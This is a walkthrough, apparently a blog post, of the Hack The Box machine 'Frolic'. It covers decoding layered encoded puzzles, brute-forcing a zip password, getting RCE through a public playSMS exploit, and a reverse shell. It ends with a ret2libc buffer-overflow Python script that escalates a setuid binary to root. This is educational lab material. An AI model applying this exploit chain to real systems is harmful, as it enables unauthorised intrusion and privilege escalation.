lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAAIt appears to be a base64 encoded message, so when I decoded it show a PK‚Ä¶ among other random bytes.So this is a zip file.When I tried the unzip It asks for a password. I just brute forced it and the password found as was ‚Äúpassword‚Äù, how cool xd.Moving on, the file inside called ‚Äúindex.php‚Äù shows:4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0aobviously some hex codedecoding it we get another b64 and after that we find this+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;++..&lt;That‚Äôs clearly a brain f*ck code. Let‚Äôs see what is saysCool, we got something that looks like a password, but password for what? üòøLet‚Äôs go back to our enumeration phase and start over, we must have missed something.The backup gives us some creds, but it is a rabbit hole :(the test page gives us php info. nothing useful.dev page a 403 error.Awesome, after some more enumeration we got nothing xdLet‚Äôs keep tryingLooking into dev/ folder we have another backup.And there we have a /playsms folder, finally something to use ours creds on.To get our reverse shell I found this great exploit on github.CLICK TO ACCESS GITHUB- jasperlaSweet! We got rce.Since this is a pretty bad shell I got a new one using php and netcat. But I‚Äôll just skip this part xdAfter getting a better shell, just went to the user home dir and found user.txt xd.Now the root part!Searching the home directory of ayush, we find a .binary dir.We find a ‚Äúrop‚Äù binary. Notice its permissions, any user can execute it and do it as root because the sticky bit is set.So if we invoke a shell using this binary we get root, let‚Äôs try.In this post I‚Äôll not be explaining how a buffer overflow occurs or how to exploit it in details. I‚Äôm just gonna explain some thoughts that I had during the exploitation.The binary simply runs with an argument the we pass and spits it back out for us, nothing interesting, however if we send a lot of bytes to it, it breaks.Cool, we can overwrite EIP but return where?The name of the binary already gives us a pretty good hint on what to do, let‚Äôs use a technique called ‚ÄúReturn to libc‚Äù that is a type of ROP.You can learn more what is ROP hereIf you wanna know more about Ret2libc those following links helped me a lot.CLICK TO ACCESS RET2LIBCSo basically we need 5 things to succeed.\tThe offset to overwrite EIP\tlibc base address\tsystem call offset\texit call offset (optional)\tstring ‚Äú/bin/bash‚ÄùLets do one by one:To get the offset to overwrite eip I used that pretty standard technique with pattern_create, and got a number of 52.To get libc base address we use ldd and grep for libc.Note: ASLR is turned off in this box, so lucky for us we don‚Äôt need to bypass it.Now we need system call offset for libc we doreadelf -s /lib/i386-linux-gnu/libc.so.6 | grep systemSame thing for exit function.readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exitNow the last thing we need is to find ‚Äú/bin/sh‚Äù string, we do.strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/shSweet, we got everything we need. Let‚Äôs chain all together with some python code.import structoffset = \"A\"*52libc_base_addr = 0xb7e19000system_base_addr = 0x0003ada0exit_base_addr = 0x0002e9d0base_sh = 0x0015ba0bsystem_addr = struct.pack(\"&lt;I\", libc_base_addr + system_base_addr)exit_addr = struct.pack (\"&lt;I\", libc_base_addr + exit_base_addr)bin_sh = struct.pack(\"&lt;I\", libc_base_addr + base_sh)print offset + system_addr + exit_addr + bin_shSo running this:we get our root shell!Hope you guys enjoyed it!by me",
        "url": "/Frolic-hackthebox-walkthrough/"
      }
